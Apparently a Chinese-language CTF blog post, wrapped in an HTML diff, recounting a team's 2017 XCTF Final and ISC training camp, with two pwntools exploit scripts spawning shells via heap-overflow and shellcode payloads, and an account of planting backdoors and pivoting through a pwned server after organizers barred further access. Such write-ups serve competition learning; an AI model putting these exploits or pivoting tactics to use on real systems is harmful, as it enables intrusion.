@@ -1,0 +1,393 @@
+<!DOCTYPE html>
+<html lang=zh>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+    <meta name="description" content="有幸参加了XCTF的决赛，麦香师傅让我好好总结下">
+<meta property="og:type" content="article">
+<meta property="og:title" content="XCTF-Final &amp;isc安全训练营 参加总结">
+<meta property="og:url" content="https://bestwing.me/2017-XCTF-Final.html">
+<meta property="og:site_name" content="Swing&#39;Blog 有恨无人省">
+<meta property="og:description" content="有幸参加了XCTF的决赛，麦香师傅让我好好总结下">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/17-xctf-final-01.jpg">
+<meta property="og:image" content="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/17-iscc-01.jpg">
+<meta property="og:image" content="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/17-xctf-final-challenge-list.jpg">
+<meta property="og:image" content="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/17-xctf-final-01-scordboard.jpg">
+<meta property="og:image" content="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/17-xctf-final-01-scordboard.jpg">
+<meta property="article:published_time" content="2017-09-13T16:00:00.000Z">
+<meta property="article:modified_time" content="2019-09-23T17:43:00.000Z">
+<meta property="article:author" content="Swing">
+<meta property="article:tag" content="XCTF">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/17-xctf-final-01.jpg">
+    
+    
+        
+          
+              <link rel="shortcut icon" href="/images/favicon.ico">
+          
+        
+        
+          
+            <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+          
+        
+        
+          
+            <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+          
+        
+    
+    <!-- title -->
+    <title>XCTF-Final &amp;isc安全训练营 参加总结</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+      
+<link rel="stylesheet" href="/css/rtl.css">
+
+    
+    <!-- rss -->
+    
+    
+      <link rel="alternate" href="/atom.xml" title="Swing&#39;Blog 有恨无人省" type="application/atom+xml" />
+    
+<meta name="generator" content="Hexo 5.2.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+         
+          <li><a href="https://bestwing.me">Home</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/archives/">Articles</a></li>
+         
+          <li><a href="/link">Links</a></li>
+         
+          <li><a href="/search/">Search</a></li>
+         
+          <li><a href="/atom.xml">rss</a></li>
+         
+          <li><a href="/categories/">categories</a></li>
+        
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" href="/Mac-Surge-2.html"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" href="/2017-HITB-CTF-Pwn.html"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">上一篇</span>
+      <span id="i-next" class="info" style="display:none;">下一篇</span>
+      <span id="i-top" class="info" style="display:none;">返回顶部</span>
+      <span id="i-share" class="info" style="display:none;">分享文章</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=https://bestwing.me/2017-XCTF-Final.html"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=https://bestwing.me/2017-XCTF-Final.html&text=XCTF-Final &amp;isc安全训练营 参加总结"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=https://bestwing.me/2017-XCTF-Final.html&title=XCTF-Final &amp;isc安全训练营 参加总结"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=https://bestwing.me/2017-XCTF-Final.html&is_video=false&description=XCTF-Final &amp;isc安全训练营 参加总结"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=XCTF-Final &amp;isc安全训练营 参加总结&body=Check out this article: https://bestwing.me/2017-XCTF-Final.html"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=https://bestwing.me/2017-XCTF-Final.html&title=XCTF-Final &amp;isc安全训练营 参加总结"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=https://bestwing.me/2017-XCTF-Final.html&title=XCTF-Final &amp;isc安全训练营 参加总结"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=https://bestwing.me/2017-XCTF-Final.html&title=XCTF-Final &amp;isc安全训练营 参加总结"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=https://bestwing.me/2017-XCTF-Final.html&title=XCTF-Final &amp;isc安全训练营 参加总结"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=https://bestwing.me/2017-XCTF-Final.html&name=XCTF-Final &amp;isc安全训练营 参加总结&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://news.ycombinator.com/submitlink?u=https://bestwing.me/2017-XCTF-Final.html&t=XCTF-Final &amp;isc安全训练营 参加总结"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#First-Day"><span class="toc-number">1.</span> <span class="toc-text">First Day</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Second-Day"><span class="toc-number">2.</span> <span class="toc-text">Second Day</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#sof"><span class="toc-number">2.1.</span> <span class="toc-text">sof</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#printf"><span class="toc-number">2.2.</span> <span class="toc-text">printf</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#packegt"><span class="toc-number">2.3.</span> <span class="toc-text">packegt</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#sof2"><span class="toc-number">2.4.</span> <span class="toc-text">sof2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#mp3info"><span class="toc-number">2.5.</span> <span class="toc-text">mp3info</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Third-Day"><span class="toc-number">3.</span> <span class="toc-text">Third Day</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#pointguard"><span class="toc-number">3.1.</span> <span class="toc-text">pointguard</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#apatch"><span class="toc-number">3.2.</span> <span class="toc-text">apatch</span></a></li></ol></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        XCTF-Final &amp;isc安全训练营 参加总结
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">Swing'Blog 有恨无人省</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2017-09-13T16:00:00.000Z" itemprop="datePublished">2017-09-14</time>
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fas fa-archive"></i>
+        <a class="category-link" href="/categories/note/">note</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fas fa-tag"></i>
+        <a class="tag-link-link" href="/tags/XCTF/" rel="tag">XCTF</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <h2 id="First-Day"><a href="#First-Day" class="headerlink" title="First Day"></a>First Day</h2><p>第一天去了isc安全训练营,<br><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/17-xctf-final-01.jpg"></p>
+<p>早上听了浏览器内容，主要内容是微软Edge和谷歌Chrome两个浏览器，Chrome是大宝师傅讲的内容。</p>
+<p>比较有印象的的是Vulcan Team 的holynop讲的Edge浏览器的Chakra脚本引擎<br>了解了类型混淆的漏洞，以及如何去利用windgb去调试浏览器。<br>完成rce<br><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/17-iscc-01.jpg"></p>
+<p><del>（准备自己动手调试下这个漏洞！！！ 应该也会写个博客吧或者拿去投稿？？？）</del></p>
+<p>下午呢，讲的是windows内核漏洞</p>
+<p>手头有poc 也是应该准备复现的漏洞！</p>
+<h2 id="Second-Day"><a href="#Second-Day" class="headerlink" title="Second Day"></a>Second Day</h2><p>这一天正式参加了XCTF决赛了。<br>第一天是Ai解题，</p>
+<p>我们们的策略是，不管是什么题目，第一步发送超级长的字符串，能crash的先让他crash，<br>所以第一天刚开始的时候，我们就get到了六个题目。<br>其中基本都是栈溢出的题目。</p>
+<p>由于是Ai赛制是Ai先crash题目之后我们才能拿到bin文件（正常是这样，但是。。。HHH），</p>
+<h3 id="sof"><a href="#sof" class="headerlink" title="sof"></a>sof</h3><p>栈溢出题目很简单</p>
+<h3 id="printf"><a href="#printf" class="headerlink" title="printf"></a>printf</h3><p>有两个漏洞，一个是fmt，一个是栈溢出，fmt的pritnf两个参数我们都可以控制，就是由于这个原因，我们刚开始就一直在gang 格式化传这个点，而忽略了栈溢出。。</p>
+<p>最后还是用栈溢出解决了题目</p>
+<h3 id="packegt"><a href="#packegt" class="headerlink" title="packegt"></a>packegt</h3><p>一个堆溢出漏洞，利用方式是house of force</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment">#!/usr/bin/env python2</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line">LOCAL = <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#env = &#123;&#x27;LD_PRELOAD&#x27;:&#x27;libc.so.6&#x27;&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> LOCAL:</span><br><span class="line">    p = process(<span class="string">&#x27;./packet&#x27;</span>)<span class="comment">#,env=env)</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">&#x27;10.0.14.1&#x27;</span>,<span class="number">9999</span>)</span><br><span class="line"></span><br><span class="line">puts_got = <span class="number">0x0000000000601018</span></span><br><span class="line">shellcode = <span class="string">&quot;\x90&quot;</span>*<span class="number">8</span></span><br><span class="line"><span class="comment">#shellcode +=&quot;\x31\xd2\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x52\x53\x89\xe1\x8d\x42\x0b\xcd\x80&quot;</span></span><br><span class="line">shellcode += asm(shellcraft.amd64.linux.sh())</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ope</span>(<span class="params">size,string=<span class="string">&quot;&quot;</span></span>):</span></span><br><span class="line">    pl = <span class="string">&quot;td&quot;</span></span><br><span class="line">    pl += str(size)</span><br><span class="line">    pl += string</span><br><span class="line">    p.send(pl)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    breakpoint = [0x40096d]</span></span><br><span class="line"><span class="string">    bp = &quot;&quot;.join([&quot;b *%d\n&quot;%b for b in breakpoint])</span></span><br><span class="line"><span class="string">    gdb.attach(proc.pidof(p)[0],bp)</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    p.readline()</span><br><span class="line">    p.sendline(<span class="string">&quot;gpRGF622u64jnH6rlgoLgpqGQCjZL42c&quot;</span>)</span><br><span class="line">    ope(<span class="number">0</span>,<span class="string">&quot;\xff&quot;</span>*<span class="number">0x25</span> + shellcode)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;0x&quot;</span>)</span><br><span class="line">    rev = p.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    sc_addr = int(rev[:<span class="number">-1</span>],<span class="number">16</span>)</span><br><span class="line">    log.info(<span class="string">&quot;sc:&#123;0&#125;&quot;</span>.format(hex(sc_addr)))</span><br><span class="line">    <span class="comment">#heap_addr = int(ope(9,&quot;\xff&quot; * 0x100),16)</span></span><br><span class="line">    <span class="comment">#log.info(&quot;heap:&#123;0&#125;&quot;.format(heap_addr))</span></span><br><span class="line">    size = (puts_got - sc_addr - <span class="number">0x20</span>)</span><br><span class="line"></span><br><span class="line">    ope(size)</span><br><span class="line">    ope(<span class="number">0</span>,<span class="string">&quot;\x00&quot;</span>*<span class="number">5</span>+ p64(<span class="number">0</span>) + p64(sc_addr+<span class="number">0x30</span>))</span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
+<p>到了下午<br>我们到Ai一直没有半点动静了，一直没有新题出来，导致我们可以选择到题目太少，一直僵持在只有六题到情况下。<br><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/17-xctf-final-challenge-list.jpg"></p>
+<p>但是这个时候我们到burnegg蛋总在早上到时候已经把Ai到题目全部脱了下来了，一共20个一个不少，于是我换了一个策略，决定人工审题，然后上去。。。那个啥。。。</p>
+<p>于是后面我们又get了 sof2 和 pointguard两个题到crash<br>但是这个时候主办方来了，告诉我们上去到次数太多了，不允许再让我们上去了。。于是我们准备让蛋总来以pwn题目的服务器最为跳板，然后去访问Ai服务器，这次我们自己手动crash</p>
+<p>然后。。。蛋总以我们已经Pwn的题目的服务器的一个稳定shell去访问了Ai服务器，<br>最后第一天比赛结束时候，我们到了第四到名次</p>
+<p><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/17-xctf-final-01-scordboard.jpg"></p>
+<p>下午解出来到题目</p>
+<h3 id="sof2"><a href="#sof2" class="headerlink" title="sof2"></a>sof2</h3><p>栈溢出</p>
+<h3 id="mp3info"><a href="#mp3info" class="headerlink" title="mp3info"></a>mp3info</h3><p>以及吐槽一下错过了一个上分到机会，pointguard特么太简单了，应该先写exp的，然后再去crash其他题目</p>
+<h2 id="Third-Day"><a href="#Third-Day" class="headerlink" title="Third Day"></a>Third Day</h2><p>第三天，攻防赛</p>
+<p>四个题目，以第前一天的pointguard以及apatch和两个未放出的新题,我们可爱的蛋总同学，由于已经逃了两天课了，想到今天没有web就跑回学校了….于是我们就成了三人组 铁人三项参赛者～</p>
+<h3 id="pointguard"><a href="#pointguard" class="headerlink" title="pointguard"></a>pointguard</h3><p>任意地址写以及格式化传漏洞<br>这个题目规则不允许我们进行patch 只能通过backlist进行拒绝访问的地址，导致这个题目。。。基本没有人防成功</p>
+<p>我们当天完成了三个利用 1.system 2.rop. 3.one gadget</p>
+<h3 id="apatch"><a href="#apatch" class="headerlink" title="apatch"></a>apatch</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.word_size = <span class="number">64</span></span><br><span class="line">context.os = <span class="string">&quot;linux&quot;</span></span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line">context.endian = <span class="string">&quot;little&quot;</span></span><br><span class="line">elf = ELF(<span class="string">&quot;apatch&quot;</span>)</span><br><span class="line">pro = process(<span class="string">&quot;./apatch&quot;</span>)</span><br><span class="line">context.terminal = [<span class="string">&#x27;deepin-terminal&#x27;</span>, <span class="string">&#x27;-x&#x27;</span>, <span class="string">&#x27;sh&#x27;</span>, <span class="string">&#x27;-c&#x27;</span>]</span><br><span class="line"></span><br><span class="line">gdb.attach(pro)</span><br><span class="line"></span><br><span class="line">shellcode = shellcraft.amd64.linux.sh()</span><br><span class="line">shellcode = asm(shellcode)</span><br><span class="line">payload = p32(<span class="number">0xdeadfafa</span>) + p8(<span class="number">0</span>)</span><br><span class="line">payload += p32(<span class="number">0x3eeb</span>) + p32(<span class="number">1</span>) + p32(len(shellcode))</span><br><span class="line">payload += shellcode</span><br><span class="line">pause()</span><br><span class="line">pro.write(payload)</span><br><span class="line">d = pro.read(<span class="number">1</span>)</span><br><span class="line"><span class="keyword">assert</span> ord(d) == <span class="number">0xcc</span></span><br><span class="line">tmp = pro.read(<span class="number">4</span>)</span><br><span class="line"><span class="keyword">print</span> tmp</span><br><span class="line">index = u32(tmp)</span><br><span class="line"><span class="keyword">print</span> hex(index)</span><br><span class="line"></span><br><span class="line">payload = p32(<span class="number">0xdeadfafa</span>) + p8((<span class="number">0x2030a0</span> - <span class="number">0x203020</span>)/<span class="number">8</span>)</span><br><span class="line">pause()</span><br><span class="line">pro.write(payload)</span><br><span class="line">pro.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>刚开始的分工是，muhe写black list的patch，通过流量审，添加到blacklist中，然后flier进行新exp，我进行运维，以及后门的添加。。。</p>
+<p>然而，流量审查中出现了应该whireshark打不开流量包的尴尬。。。</p>
+<p>以及后门添加不进去的尴尬。。。于是我们只能手动保持ssh的存在 维持权限，不会以至于对手patch文件后我们不能get flag了</p>
+<p>。。。但是windows用多了。。。我不小心关了五个。。。／bin／sh剩三个。。。</p>
+<p>运维的时候，，，我也出了一点尴尬，，，发现后门的时间太晚了。。。</p>
+<p>所以，，，第二天我们全程是在防守，无暇去尝试流量重放以及去写新的exp去攻击对手</p>
+<p>所以Good Game！<br><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/17-xctf-final-01-scordboard.jpg"></p>
+
+  </div>
+</article>
+
+    <div class="blog-post-comments">
+        <div id="disqus_thread">
+            <noscript>加载评论需要在浏览器启用 JavaScript 脚本支持。</noscript>
+        </div>
+    </div>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="https://bestwing.me">Home</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/archives/">Articles</a></li>
+         
+          <li><a href="/link">Links</a></li>
+         
+          <li><a href="/search/">Search</a></li>
+         
+          <li><a href="/atom.xml">rss</a></li>
+         
+          <li><a href="/categories/">categories</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#First-Day"><span class="toc-number">1.</span> <span class="toc-text">First Day</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Second-Day"><span class="toc-number">2.</span> <span class="toc-text">Second Day</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#sof"><span class="toc-number">2.1.</span> <span class="toc-text">sof</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#printf"><span class="toc-number">2.2.</span> <span class="toc-text">printf</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#packegt"><span class="toc-number">2.3.</span> <span class="toc-text">packegt</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#sof2"><span class="toc-number">2.4.</span> <span class="toc-text">sof2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#mp3info"><span class="toc-number">2.5.</span> <span class="toc-text">mp3info</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Third-Day"><span class="toc-number">3.</span> <span class="toc-text">Third Day</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#pointguard"><span class="toc-number">3.1.</span> <span class="toc-text">pointguard</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#apatch"><span class="toc-number">3.2.</span> <span class="toc-text">apatch</span></a></li></ol></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=https://bestwing.me/2017-XCTF-Final.html"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=https://bestwing.me/2017-XCTF-Final.html&text=XCTF-Final &amp;isc安全训练营 参加总结"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=https://bestwing.me/2017-XCTF-Final.html&title=XCTF-Final &amp;isc安全训练营 参加总结"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=https://bestwing.me/2017-XCTF-Final.html&is_video=false&description=XCTF-Final &amp;isc安全训练营 参加总结"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=XCTF-Final &amp;isc安全训练营 参加总结&body=Check out this article: https://bestwing.me/2017-XCTF-Final.html"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=https://bestwing.me/2017-XCTF-Final.html&title=XCTF-Final &amp;isc安全训练营 参加总结"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=https://bestwing.me/2017-XCTF-Final.html&title=XCTF-Final &amp;isc安全训练营 参加总结"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=https://bestwing.me/2017-XCTF-Final.html&title=XCTF-Final &amp;isc安全训练营 参加总结"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=https://bestwing.me/2017-XCTF-Final.html&title=XCTF-Final &amp;isc安全训练营 参加总结"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=https://bestwing.me/2017-XCTF-Final.html&name=XCTF-Final &amp;isc安全训练营 参加总结&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://news.ycombinator.com/submitlink?u=https://bestwing.me/2017-XCTF-Final.html&t=XCTF-Final &amp;isc安全训练营 参加总结"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> 菜单</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> 目录</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> 返回顶部</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2020
+    Swing
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+          <li><a href="https://bestwing.me">Home</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/archives/">Articles</a></li>
+         
+          <li><a href="/link">Links</a></li>
+         
+          <li><a href="/search/">Search</a></li>
+         
+          <li><a href="/atom.xml">rss</a></li>
+         
+          <li><a href="/categories/">categories</a></li>
+        
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+
+<link rel="stylesheet" href="/lib/justified-gallery/css/justifiedGallery.min.css">
+
+
+    <!-- jquery -->
+
+<script src="/lib/jquery/jquery.min.js"></script>
+
+
+<script src="/lib/justified-gallery/js/jquery.justifiedGallery.min.js"></script>
+
+<!-- clipboard -->
+
+  
+<script src="/lib/clipboard/clipboard.min.js"></script>
+
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"复制到粘贴板!\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "复制成功!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Google Analytics -->
+
+    <script type="text/javascript">
+        (function(i,s,o,g,r,a,m) {i['GoogleAnalyticsObject']=r;i[r]=i[r]||function() {
+        (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+        m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+        })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+        ga('create', 'UA-133464311-1', 'auto');
+        ga('send', 'pageview');
+    </script>
+
+<!-- Baidu Analytics -->
+
+    <script type="text/javascript">
+        var _hmt = _hmt || [];
+        (function() {
+            var hm = document.createElement("script");
+            hm.src = "https://hm.baidu.com/hm.js?2e6da3c375c8a87f5b664cea6d4cb29c";
+            var s = document.getElementsByTagName("script")[0];
+            s.parentNode.insertBefore(hm, s);
+        })();
+    </script>
+
+<!-- Disqus Comments -->
+
+    <script type="text/javascript">
+        var disqus_shortname = 'swing';
+
+        (function(){
+            var dsq = document.createElement('script');
+            dsq.type = 'text/javascript';
+            dsq.async = true;
+            dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+        }());
+    </script>
+
+
+</body>
+</html>
